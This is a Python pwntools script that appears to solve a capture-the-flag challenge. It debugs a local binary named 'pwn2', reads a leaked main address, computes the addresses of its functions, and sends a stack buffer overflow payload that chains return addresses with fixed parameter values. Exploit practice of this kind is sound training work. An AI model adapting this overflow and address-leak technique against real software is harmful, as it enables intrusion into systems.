import pwnlib.elf
import pwnlib.rop.rop
import pwnlib.tubes.remote
import pwnlib.context
import pwnlib.gdb
from struct import pack

pwnlib.context.context.clear(arch='amd64', os='linux')
pwnlib.context.context.terminal = ["tmux", "splitw", "-h"]

# Create gdb server
io = pwnlib.gdb.debug('./pwn2', '''
layout asm
#break *vuln+78
#break *Hawiya+166
#break *Jahim+166
break loss
continue
''')

# Connect to remote server and get the main address
first_line = io.recvline()
print(first_line)
main_address = int(str(first_line).split()[-1][:-3], base=16)
print("main address is", main_address)

# Get the offset of functions
e = pwnlib.elf.ELF('pwn')
JAHIM_LOCATION = e.functions['Jahim'].address - e.functions['main'].address + main_address
HAWIYA_LOCATION = e.functions['Hawiya'].address - e.functions['main'].address + main_address
LOSS_LOCATION = e.functions['loss'].address - e.functions['main'].address + main_address
print("Jahim:", hex(JAHIM_LOCATION))
print("Hawiya:", hex(HAWIYA_LOCATION))
print("loss:", hex(LOSS_LOCATION))

# Create the payload
payload = bytearray()
payload += ('a' * (0x20 + 8)).encode('ascii') # SUB RSP,0x20 + PUSH RBP, overflow the stack
payload += pack('L', HAWIYA_LOCATION)
payload += pack('L', JAHIM_LOCATION)
payload += pack('L', LOSS_LOCATION)
payload += pack('I', 0x1337c0de) # first parameter
payload += pack('I', 0xdeadc0de - 0x1337c0de) # second parameter
payload += pack('L', 0) # dummy return address
print("sending", payload)
io.sendline(payload)
io.interactive()
io.close()